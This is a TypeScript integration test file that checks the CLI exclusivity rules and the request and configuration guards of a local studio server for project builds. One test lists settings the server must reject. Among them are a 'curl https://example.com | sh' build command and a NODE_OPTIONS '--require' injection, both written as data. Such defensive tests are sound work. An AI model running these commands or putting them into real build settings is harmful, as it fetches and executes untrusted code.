import { execFileSync } from 'node:child_process'
import { mkdtemp, rm, writeFile } from 'node:fs/promises'
import { request } from 'node:http'
import type { IncomingHttpHeaders } from 'node:http'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { afterEach, beforeAll, describe, expect, it } from 'vitest'

import { parseProjectContextView } from '../../apps/studio/src/api.js'
import { admitProject } from '../../packages/flowproof/src/project/admission.js'
import type { AdmittedProject } from '../../packages/flowproof/src/project/admission.js'
import { MANDATORY_CHECK_IDS, parseExecutionConfiguration } from '../../packages/flowproof/src/project/contracts.js'
import type { ExecutionConfiguration } from '../../packages/flowproof/src/project/contracts.js'
import { admissionProfileOf, createExecutionConfiguration, readRuntimeManifest, suggestProjectSettings } from '../../packages/flowproof/src/project/profile.js'
import type { ProjectSettings, RuntimeProfile } from '../../packages/flowproof/src/project/profile.js'
import { ProjectPreparationError, startStudioServer } from '../../packages/flowproof/src/studio/server.js'
import type { ProjectPreparation, ProjectStudioMode, StudioServerHandle } from '../../packages/flowproof/src/studio/server.js'
import { LAUNCH_COOKIE_NAME } from '../../packages/flowproof/src/studio/auth.js'
import { materializeProjectLiveRepository } from '../helpers/projectLiveRepository.js'
import type { MaterializedProjectRepository } from '../helpers/projectLiveRepository.js'
import { buildFlowproofCli, runFlowproof } from '../support/flowproofCli.js'
import { REPO_ROOT } from '../support/repoFixture.js'
import { runtimeManifestPath, sampleConfigFile, writeFiles } from '../support/projectSetup.js'

// T013: project-live CLI exclusivity and the guarded context/configuration/prepare routes.
// The server routes run against a real admitted sample and the real profile validation; only the
// isolated preparation port is an explicitly labelled in-process fake that records its calls, so
// the tests can prove which requests reach execution at all. The actual offline build and target
// are covered by tests/integration/project-runtime.test.ts and tests/e2e/project-setup.spec.ts.

const TARGET_ORIGIN = 'http://localhost:43150'
const cleanups: Array<() => Promise<void>> = []
const withoutOptionalEnvNotice = (stderr: string): string => stderr.replace(/^\.env not found\. Continuing without it\.\r?\n/, '')

afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup().catch(() => undefined)
})

async function sample(): Promise<MaterializedProjectRepository> {
  const repository = await materializeProjectLiveRepository()
  cleanups.push(() => repository.remove())
  return repository
}

let profile: RuntimeProfile

beforeAll(async () => {
  // The operator manifest is read as data only; no image is inspected or container started here.
  profile = await readRuntimeManifest(runtimeManifestPath())
})

async function admitted(root: string): Promise<AdmittedProject> {
  const admission = await admitProject({ root, profile: admissionProfileOf(profile) })
  if (admission.state !== 'ready') throw new Error('fixture admission failed')
  return admission.project
}

/** LABELLED IN-PROCESS FAKE preparation: records each call; it never builds or serves anything. */
interface FakePreparation {
  readonly calls: ExecutionConfiguration[]
  readonly releases: number[]
  readonly signals: AbortSignal[]
  resolveNext(value?: Partial<ProjectPreparation>): void
  rejectNext(error: unknown): void
}

function fakePreparation(): { readonly fake: FakePreparation; readonly ports: Pick<ProjectStudioMode, 'prepare' | 'release'> } {
  const pending: Array<{ resolve: (value: ProjectPreparation) => void; reject: (error: unknown) => void }> = []
  const calls: ExecutionConfiguration[] = []
  const releases: number[] = []
  const signals: AbortSignal[] = []
  const fake: FakePreparation = {
    calls,
    releases,
    signals,
    resolveNext: (value = {}) =>
      pending.shift()?.resolve({ target_url: `${TARGET_ORIGIN}/`, output_sha256: '1'.repeat(64), checks: [{ id: 'sample-unit', status: 'passed' }], ...value }),
    rejectNext: (error) => pending.shift()?.reject(error),
  }
  return {
    fake,
    ports: {
      prepare: (configuration, signal) => {
        calls.push(configuration)
        signals.push(signal)
        return new Promise((resolve, reject) => pending.push({ resolve, reject }))
      },
      release: async () => {
        releases.push(Date.now())
      },
    },
  }
}

interface Started {
  readonly server: StudioServerHandle
  readonly project: AdmittedProject
  readonly fake: FakePreparation
}

async function startProjectServer(options: { readonly withConfig?: boolean; readonly env?: Record<string, string> } = {}): Promise<Started> {
  const repository = await sample()
  const project = await admitted(repository.root)
  const { fake, ports } = fakePreparation()
  const settings = options.withConfig ? await sampleConfigFile() : null
  const server = await startStudioServer({
    targetOrigin: TARGET_ORIGIN,
    project: {
      context: project.context,
      modelConfigured: (options.env?.MODEL_API_KEY ?? '').trim() !== '',
      suggestion: suggestProjectSettings(project),
      initialSettings:
        settings === null
          ? null
          : { entry_path: settings.entry_path as string, build: settings.build as never, required_project_checks: settings.required_project_checks as never },
      configure: (input, confirmedAt) => createExecutionConfiguration({ project, profile, settings: input, targetOrigin: TARGET_ORIGIN, confirmedAt }),
      ...ports,
    },
  })
  cleanups.push(() => server.close())
  return { server, project, fake }
}

interface Reply {
  readonly status: number
  readonly headers: IncomingHttpHeaders
  readonly body: string
  json(): any
}

function call(
  server: StudioServerHandle,
  method: string,
  route: string,
  options: { readonly body?: string; readonly headers?: Record<string, string>; readonly cookie?: string | null; readonly origin?: string | null; readonly host?: string } = {},
): Promise<Reply> {
  const cookie = options.cookie === undefined ? `${LAUNCH_COOKIE_NAME}=${server.session.launchCookie().value}` : options.cookie
  const headers: Record<string, string> = {
    Host: options.host ?? server.session.authority,
    'Sec-Fetch-Site': 'same-origin',
    ...(cookie === null ? {} : { Cookie: cookie }),
    ...(method === 'POST' && options.origin !== null ? { Origin: options.origin ?? server.origin, 'Content-Type': 'application/json' } : {}),
    ...options.headers,
  }
  return new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port: server.address.port, method, path: route, headers }, (res) => {
      let body = ''
      res.setEncoding('utf8')
      res.on('data', (chunk: string) => (body += chunk))
      res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body, json: () => JSON.parse(body) }))
    })
    req.on('error', reject)
    req.end(options.body)
  })
}

const post = (server: StudioServerHandle, route: string, body: unknown, options: Parameters<typeof call>[3] = {}) =>
  call(server, 'POST', route, { ...options, body: typeof body === 'string' ? body : JSON.stringify(body) })

async function settingsBody(project: AdmittedProject, overrides: Record<string, unknown> = {}, settings?: Record<string, unknown>) {
  const file = await sampleConfigFile()
  return {
    project_id: project.context.project_id,
    baseline_commit: project.context.baseline_commit,
    settings: settings ?? { entry_path: file.entry_path, build: file.build, required_project_checks: file.required_project_checks },
    confirm: true,
    ...overrides,
  }
}

async function waitFor(check: () => Promise<boolean>, timeoutMs = 5_000): Promise<void> {
  const deadline = Date.now() + timeoutMs
  while (!(await check())) {
    if (Date.now() > deadline) throw new Error('condition not reached')
    await new Promise((resolve) => setTimeout(resolve, 20))
  }
}

describe('CLI project mode exclusivity and read-only preconditions', () => {
  beforeAll(async () => {
    await buildFlowproofCli()
  }, 180_000)

  const runCli = (args: readonly string[], env: Record<string, string> = {}) =>
    runFlowproof(args, { cwd: REPO_ROOT, env: { FLOWPROOF_PROJECT_PROFILE_MANIFEST: runtimeManifestPath(), ...env } }, 60_000)

  it('rejects --project together with --scenario and --project-config without --project as usage errors', async () => {
    const repository = await sample()
    const both = await runCli(['studio', '--project', repository.root, '--scenario', 'canvas-filter-hero'])
    cleanups.push(() => both.tmp.remove())
    expect(both.code).toBe(3)
    expect(withoutOptionalEnvNotice(both.stderr).trim()).toBe('CLI_USAGE_INVALID: Usage: flowproof studio [--scenario <scenario-id>] | --project <path> [--project-config <path>].')
    const orphan = await runCli(['studio', '--project-config', path.join(repository.root, 'package.json')])
    cleanups.push(() => orphan.tmp.remove())
    expect(orphan.code).toBe(3)
    expect(orphan.stderr).toContain('CLI_USAGE_INVALID')
    expect(both.stdout + orphan.stdout).toBe('')
  })

  it('refuses invalid, dirty and misconfigured projects with fixed codes before any build, browser or container', async () => {
    const dirty = await sample()
    await writeFiles(dirty.root, { 'src/tasks.js': '// dirty\n' })
    const blocked = await runCli(['studio', '--project', dirty.root])
    cleanups.push(() => blocked.tmp.remove())
    expect(blocked.code).toBe(3)
    expect(withoutOptionalEnvNotice(blocked.stderr).trim()).toBe('PROJECT_ADMISSION_BLOCKED: The selected project cannot be admitted (PROJECT_TRACKED_CHANGES).')
    expect(blocked.stderr).not.toContain(dirty.root)

    const missing = await runCli(['studio', '--project', path.join(dirty.root, 'absent')])
    cleanups.push(() => missing.tmp.remove())
    expect(missing.code).toBe(3)
    expect(withoutOptionalEnvNotice(missing.stderr).trim()).toBe('PROJECT_ADMISSION_BLOCKED: The selected project cannot be admitted (PROJECT_PATH_INVALID).')

    const clean = await sample()
    const configDir = await mkdtemp(path.join(tmpdir(), 'flowproof-project-config-'))
    cleanups.push(() => rm(configDir, { recursive: true, force: true }))
    const configPath = path.join(configDir, 'project.json')
    // Policy the host owns cannot be chosen by configuration: image, network, environment, model.
    for (const extra of [{ image: 'node:latest' }, { network: 'host' }, { environment: { MODEL_API_KEY: 'x' } }, { model: 'other' }]) {
      await writeFile(configPath, JSON.stringify({ ...(await sampleConfigFile()), ...extra }))
      const refused = await runCli(['studio', '--project', clean.root, '--project-config', configPath])
      cleanups.push(() => refused.tmp.remove())
      expect(refused.code).toBe(3)
      expect(withoutOptionalEnvNotice(refused.stderr).trim()).toBe('PROJECT_CONFIG_INVALID: The project configuration file is not a valid vite-static-v1 configuration.')
    }
    await writeFile(configPath, '{not json')
    const invalidJson = await runCli(['studio', '--project', clean.root, '--project-config', configPath])
    cleanups.push(() => invalidJson.tmp.remove())
    expect(invalidJson.code).toBe(3)
    expect(invalidJson.stderr).toContain('PROJECT_CONFIG_INVALID')

    const noManifest = await runCli(['studio', '--project', clean.root], { FLOWPROOF_PROJECT_PROFILE_MANIFEST: path.join(configDir, 'absent.json') })
    cleanups.push(() => noManifest.tmp.remove())
    expect(noManifest.code).toBe(3)
    expect(withoutOptionalEnvNotice(noManifest.stderr).trim()).toBe('PROFILE_MANIFEST_MISSING: The vite-static-v1 runtime profile manifest is not available.')
    for (const result of [blocked, missing, invalidJson, noManifest]) expect(result.stdout).toBe('')
  })

  it('keeps the existing prepared mode usage and scenario refusal unchanged', async () => {
    const cleanRoot = await mkdtemp(path.join(tmpdir(), 'flowproof-s2-clean-cli-'))
    cleanups.push(() => rm(cleanRoot, { recursive: true, force: true }))
    execFileSync('git', ['clone', '--quiet', '--shared', '--no-hardlinks', REPO_ROOT, cleanRoot], { stdio: 'ignore' })
    const unknown = await runFlowproof(['studio', '--scenario', 'no-such-case'], { cwd: cleanRoot }, 60_000)
    cleanups.push(() => unknown.tmp.remove())
    expect(unknown.code).toBe(3)
    expect(withoutOptionalEnvNotice(unknown.stderr)).toMatch(/^SCENARIO_/)
    const help = await runFlowproof(['studio', '--help'], { cwd: REPO_ROOT }, 60_000)
    cleanups.push(() => help.tmp.remove())
    expect(help.code).toBe(0)
  })
})

describe('project routes and their guards', () => {
  it('serves safe reviewable context without executing anything when no configuration was supplied', async () => {
    const { server, project, fake } = await startProjectServer({ env: { MODEL_API_KEY: 'flowproof-test-secret-value' } })
    const reply = await call(server, 'GET', '/api/project/context')
    expect(reply.status).toBe(200)
    const view = reply.json()
    expect(parseProjectContextView(view)).not.toBeNull()
    expect(view.kind).toBe('project-live')
    expect(view.project).toEqual({
      project_id: project.context.project_id,
      display_root: project.context.display_root,
      label: project.context.label,
      baseline_commit: project.context.baseline_commit,
      branch: 'main',
      category: 'vite-static-v1',
      admission: { state: 'ready', reasons: [] },
    })
    expect(view.model_configured).toBe(true)
    expect(view.configuration).toMatchObject({ state: 'required', source: 'suggestion', configuration_id: null, reasons: [] })
    expect(view.configuration.settings).toEqual(suggestProjectSettings(project))
    expect(view.preparation).toMatchObject({ state: 'idle', target_url: null })
    // The key value, integrity snapshot and file inventory never leave the controller.
    expect(reply.body).not.toContain('flowproof-test-secret-value')
    expect(reply.body).not.toContain(project.integrity.sha256)
    expect(reply.body).not.toContain('allowed_source_paths')
    expect(fake.calls).toHaveLength(0)
    expect(parseProjectContextView({ ...view, extra: true })).toBeNull()
  })

  it('applies the exact Host, Origin, fetch-metadata and launch-cookie guards to every project route', async () => {
    const { server, project, fake } = await startProjectServer({ withConfig: true })
    const body = JSON.stringify(await settingsBody(project))
    expect((await call(server, 'GET', '/api/project/context', { host: `localhost:${server.address.port}` })).status).toBe(403)
    expect((await call(server, 'GET', '/api/project/context', { headers: { 'Sec-Fetch-Site': 'cross-site' } })).status).toBe(403)
    expect((await call(server, 'GET', '/api/project/context', { cookie: null })).status).toBe(401)
    expect((await call(server, 'GET', '/api/project/context', { cookie: `${LAUNCH_COOKIE_NAME}=forged` })).status).toBe(401)
    expect((await post(server, '/api/project/configuration', body, { origin: null })).status).toBe(403)
    // The target origin can never mutate controller state.
    expect((await post(server, '/api/project/configuration', body, { origin: TARGET_ORIGIN })).status).toBe(403)
    expect((await post(server, '/api/project/prepare', { configuration_id: project.context.project_id }, { origin: TARGET_ORIGIN })).status).toBe(403)
    expect((await call(server, 'PUT', '/api/project/configuration', { body })).status).toBe(405)
    expect(fake.calls).toHaveLength(0)
  })

  it('keeps prepared-mode routes out of project mode', async () => {
    const { server } = await startProjectServer()
    expect((await call(server, 'GET', '/api/scenarios')).status).toBe(404)
    expect((await post(server, '/api/runs', { scenario_id: 'canvas-filter-hero', request_text: 'x' })).status).toBe(404)
  })

  it('keeps project routes out of the prepared mode', async () => {
    const legacy = await startStudioServer({ repoRoot: REPO_ROOT, targetOrigin: 'http://localhost:43119', env: {}, startRun: () => Promise.reject(new Error('unused')) })
    cleanups.push(() => legacy.close())
    expect((await call(legacy, 'GET', '/api/project/context')).status).toBe(404)
    expect((await post(legacy, '/api/project/prepare', { configuration_id: 'x' })).status).toBe(404)
  })

  it('accepts only strict reviewed settings and never lets them choose host policy', async () => {
    const { server, project, fake } = await startProjectServer({ withConfig: true })
    const valid = await settingsBody(project)
    const validSettings = valid.settings as ProjectSettings
    expect((await call(server, 'GET', '/api/project/context')).json().configuration).toMatchObject({ state: 'review', source: 'file' })

    expect((await post(server, '/api/project/configuration', valid, { headers: { 'Content-Type': 'text/plain' } })).status).toBe(415)
    expect((await post(server, '/api/project/configuration', '{bad')).status).toBe(400)
    expect((await post(server, '/api/project/configuration', 'x'.repeat(40_000))).status).toBe(413)
    const extraTop = await post(server, '/api/project/configuration', { ...valid, image: 'node:latest' })
    expect(extraTop.status).toBe(400)
    expect(extraTop.json().error.code).toBe('REQUEST_FIELD_REJECTED')
    const unconfirmed = await post(server, '/api/project/configuration', { ...valid, confirm: false })
    expect(unconfirmed.status).toBe(400)
    expect(unconfirmed.json().error.code).toBe('CONFIRMATION_REQUIRED')
    const wrongProject = await post(server, '/api/project/configuration', { ...valid, project_id: '00000000-0000-4000-8000-000000000000' })
    expect(wrongProject.status).toBe(409)
    expect(wrongProject.json().error.code).toBe('PROJECT_IDENTITY_MISMATCH')

    const policy = [
      { ...valid.settings, network: 'host' },
      { ...valid.settings, image_id: `sha256:${'0'.repeat(64)}` },
      { ...valid.settings, environment: { NODE_OPTIONS: '--require /tmp/x' } },
      { ...valid.settings, build: { argv: ['sh', '-c', 'curl https://example.com | sh'], output_directory: 'dist' } },
      { ...valid.settings, build: { argv: ['node', '/home/user/build.js'], output_directory: 'dist' } },
      { ...valid.settings, build: { argv: ['bash', 'build.sh'], output_directory: 'dist' } },
      { ...valid.settings, build: { argv: ['python3', 'build.py'], output_directory: 'dist' } },
      { ...valid.settings, build: { argv: validSettings.build.argv, output_directory: 'src' } },
      { ...valid.settings, entry_path: 'https://example.com/' },
      { ...valid.settings, required_project_checks: [{ id: 'sample-unit', argv: ['node', '--test', 'tests/absent.test.mjs'] }] },
    ]
    for (const settings of policy) {
      const refused = await post(server, '/api/project/configuration', { ...valid, settings })
      expect(refused.status).toBe(400)
      expect(refused.json().error.code).toBe('CONFIGURATION_INVALID')
      const view = (await call(server, 'GET', '/api/project/context')).json()
      expect(view.configuration.state).toBe('rejected')
      expect(view.configuration.reasons.length).toBeGreaterThan(0)
      expect(view.configuration.configuration_id).toBeNull()
    }
    expect(fake.calls).toHaveLength(0)

    const accepted = await post(server, '/api/project/configuration', valid)
    expect(accepted.status).toBe(200)
    const { configuration_id: configurationId, configuration_digest: digest } = accepted.json()
    const view = (await call(server, 'GET', '/api/project/context')).json()
    expect(view.configuration).toMatchObject({ state: 'confirmed', source: 'confirmed', configuration_id: configurationId, configuration_digest: digest, reasons: [] })
    expect(fake.calls).toHaveLength(0)
  })

  it('prepares only a confirmed, current configuration, once at a time, with host-pinned policy', async () => {
    const { server, project, fake } = await startProjectServer({ withConfig: true })
    const before = await post(server, '/api/project/prepare', { configuration_id: project.context.project_id })
    expect(before.status).toBe(409)
    expect(before.json().error.code).toBe('CONFIGURATION_REQUIRED')

    const { configuration_id: configurationId } = (await post(server, '/api/project/configuration', await settingsBody(project))).json()
    expect((await post(server, '/api/project/prepare', { configuration_id: configurationId, extra: 1 })).status).toBe(400)
    const stale = await post(server, '/api/project/prepare', { configuration_id: '00000000-0000-4000-8000-000000000000' })
    expect(stale.status).toBe(409)
    expect(stale.json().error.code).toBe('CONFIGURATION_STALE')
    expect(fake.calls).toHaveLength(0)

    const started = await post(server, '/api/project/prepare', { configuration_id: configurationId })
    expect(started.status).toBe(202)
    expect(fake.calls).toHaveLength(1)
    const configuration = fake.calls[0]!
    expect(parseExecutionConfiguration(configuration).ok).toBe(true)
    expect(configuration).toMatchObject({
      configuration_id: configurationId,
      project_id: project.context.project_id,
      baseline_commit: project.context.baseline_commit,
      target_origin: TARGET_ORIGIN,
      confirmation: { state: 'confirmed' },
      mandatory_checks: [...MANDATORY_CHECK_IDS],
      profile: { image_id: profile.imageId, network: 'none', environment_allowlist: [] },
    })
    expect((await call(server, 'GET', '/api/project/context')).json().preparation.state).toBe('preparing')
    const concurrent = await post(server, '/api/project/prepare', { configuration_id: configurationId })
    expect(concurrent.status).toBe(409)
    expect(concurrent.json().error.code).toBe('PROJECT_PREPARATION_ACTIVE')
    // Settings cannot change underneath an active preparation.
    expect((await post(server, '/api/project/configuration', await settingsBody(project))).status).toBe(409)

    fake.resolveNext()
    await waitFor(async () => (await call(server, 'GET', '/api/project/context')).json().preparation.state === 'ready')
    const ready = (await call(server, 'GET', '/api/project/context')).json()
    expect(ready.preparation).toEqual({ state: 'ready', reason: null, target_url: `${TARGET_ORIGIN}/`, output_sha256: '1'.repeat(64), checks: [{ id: 'sample-unit', status: 'passed' }] })

    // A settings change invalidates the prepared target before anything else happens.
    const changed = await post(server, '/api/project/configuration', await settingsBody(project))
    expect(changed.status).toBe(200)
    expect(fake.releases.length).toBeGreaterThan(0)
    const reset = (await call(server, 'GET', '/api/project/context')).json()
    expect(reset.preparation.state).toBe('idle')
    expect(reset.configuration.configuration_id).not.toBe(configurationId)
    expect((await post(server, '/api/project/prepare', { configuration_id: configurationId })).json().error.code).toBe('CONFIGURATION_STALE')
  })

  it('reports fixed preparation failures and a stale baseline without leaking messages', async () => {
    const { server, project, fake } = await startProjectServer({ withConfig: true })
    const { configuration_id: configurationId } = (await post(server, '/api/project/configuration', await settingsBody(project))).json()
    await post(server, '/api/project/prepare', { configuration_id: configurationId })
    fake.rejectNext(new ProjectPreparationError('RUNTIME_BUILD_FAILED'))
    await waitFor(async () => (await call(server, 'GET', '/api/project/context')).json().preparation.state === 'failed')
    expect((await call(server, 'GET', '/api/project/context')).json().preparation).toMatchObject({ state: 'failed', reason: 'RUNTIME_BUILD_FAILED', target_url: null })

    await post(server, '/api/project/prepare', { configuration_id: configurationId })
    fake.rejectNext(new Error('/home/secret/path leaked token=abc'))
    await waitFor(async () => (await call(server, 'GET', '/api/project/context')).json().preparation.reason === 'PROJECT_PREPARE_FAILED')
    expect((await call(server, 'GET', '/api/project/context')).body).not.toContain('/home/secret')

    await post(server, '/api/project/prepare', { configuration_id: configurationId })
    fake.rejectNext(new ProjectPreparationError('PROJECT_BASELINE_STALE', ['PROJECT_BASELINE_CHANGED']))
    await waitFor(async () => (await call(server, 'GET', '/api/project/context')).json().project.admission.state === 'stale')
    const stale = (await call(server, 'GET', '/api/project/context')).json()
    expect(stale.project.admission).toEqual({ state: 'stale', reasons: ['PROJECT_BASELINE_CHANGED'] })
    expect(stale.preparation).toMatchObject({ state: 'failed', reason: 'PROJECT_BASELINE_STALE' })
    // A stale baseline is never refreshed: further preparation is refused.
    const refused = await post(server, '/api/project/prepare', { configuration_id: configurationId })
    expect(refused.status).toBe(409)
    expect(refused.json().error.code).toBe('PROJECT_BASELINE_STALE')
  })

  it('aborts an active preparation when the server closes', async () => {
    const { server, project, fake } = await startProjectServer({ withConfig: true })
    const { configuration_id: configurationId } = (await post(server, '/api/project/configuration', await settingsBody(project))).json()
    await post(server, '/api/project/prepare', { configuration_id: configurationId })
    expect(fake.signals[0]?.aborted).toBe(false)
    await server.close()
    expect(fake.signals[0]?.aborted).toBe(true)
  })
})
